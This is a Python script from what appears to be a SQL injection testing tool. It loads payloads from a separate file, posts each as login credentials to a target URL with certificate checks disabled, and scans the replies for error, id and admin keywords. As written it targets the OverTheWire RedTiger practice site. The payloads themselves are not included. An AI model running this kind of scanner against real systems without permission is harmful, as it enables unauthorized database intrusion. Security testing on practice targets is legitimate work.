import sys
import os
parent_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(parent_dir)
current_directory = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_directory, '..'))
sys.path.append(project_root)

from regelexpression.patterns import Detect

()
add_directory = os.path.abspath(os.path.dirname(__file__))

priority_path = os.path.join(add_directory, '..', 'priority')

sys.path.append(priority_path)


from Priority import PRIORITY, HARMFULL


current_directory = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_directory, '..', '..'))

sys.path.append(project_root)

from logger.logs import logger
from Exceptions.exceptions import SQLJNGUserExit
from Exceptions.handler import extract_package_name_from_import_error

try:
    import asyncio
    import requests
    from colorama import Fore,init
    import re
    import glob
    import os
    import socket
    import time
    from datetime import datetime
    import sqlite3
    import logging
    import sys
    parent_dir = os.path.dirname(os.path.abspath(__file__))
    sys.path.append(parent_dir)
    logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)

except ImportError as e:
    msg = str(e)
    logger.error(e)
    ins = extract_package_name_from_import_error(msg)
    match input(f"Do you want to install the dependencies that has been missing? (y/n): "):
        case "y":
            from subprocess import check_call
            import subprocess
            try:
                check_call(["pip","install",str(ins)])
            
            except subprocess.CalledProcessError as expro:
                try:
                    check_call(["pip","install",str(ins), "--upgrade"])
                
                except subprocess.CalledProcessError as expro:
                    try:
                        check_call(["python3", "-m", "pip", "install", str(ins)])
                    
                    except subprocess.CalledProcessError as expro:
                        try:
                            check_call(["python3", "-m", "pip", "install", str(ins)])
                        
                        except subprocess.CalledProcessError as expro:
                            logger.error(expro)
                            raise SystemExit


            
            except PermissionError as experm:
                logger.error(experm)
                sys.exit(1)




attack_type = "generic SQL injection"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}


""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""


pattern = r"\\berror\\b"
htmlpattern = r"\\bid\\b"
generic_capture = []





            


async def generic_sql_attack_HEADER(urls):
    """This attack is when we are able to alter the database tables and gather information out of it"""
    try:
        global pattern,htmlpattern
        #
        filename = "genericsql.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            mesg = sorted_payload
            logger.info(str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the ip url: {urls}\n Do you want to send the payload to the website? ")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        params = {
                            "username": line,
                            "password": line
                        }
                        global ack
                        logger.info(f"Testing payload :{line} into the target...")
                        ack = requests.post(url=urls, data=params,verify=False)
                        msg = "Status code:"
                        logger.info(msg)
                        logger.info(ack.status_code)
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            logger.info(f"Could find parameter Error, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            
                        vuln = re.findall(pattern=pattern,string=str(ack.text),flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=str(ack.text),flags=re.IGNORECASE)
                        if vuln:
                            logger.info(f"Could find id parameter, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            
                        
                        if htmlVULN:
                            logger.info(f"Could find error parameter, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            htmlVulnerbale = True
                            
                    
                        # htmlVulner
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            logger.info(f"Could find injectable parameter(id), keyword:{line}")
                            Detect(req.text)
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            # databaseVuln = True
                        
                        if errword:
                            logger.info(f"Could find injectable parameter(error), keyword:{line}")
                            Detect(req.text)
                            await asyncio.sleep(3)
                            
                        
                            
                    if req.status_code == 302:
                        logger.info(f"Could inject parameter,keyword:{line},target:{urls}")
                    
                        done = True  
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        logger.info(f"Could find parameter admin, keyword:{line},target:{urls}")            

    except Exception as e:
        print(f"[{datetime.now()}]  Error: {str(e)}")
        logging.error(f"Error: {str(e)}")
        
    except UnicodeEncodeError:
        pass
    
   
    
 
        
    except KeyboardInterrupt:
   
        pass
    

       
    
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        
        
    finally:
        pass
       
        
        
        

asyncio.run(generic_sql_attack_HEADER("https://redtiger.labs.overthewire.org/"))






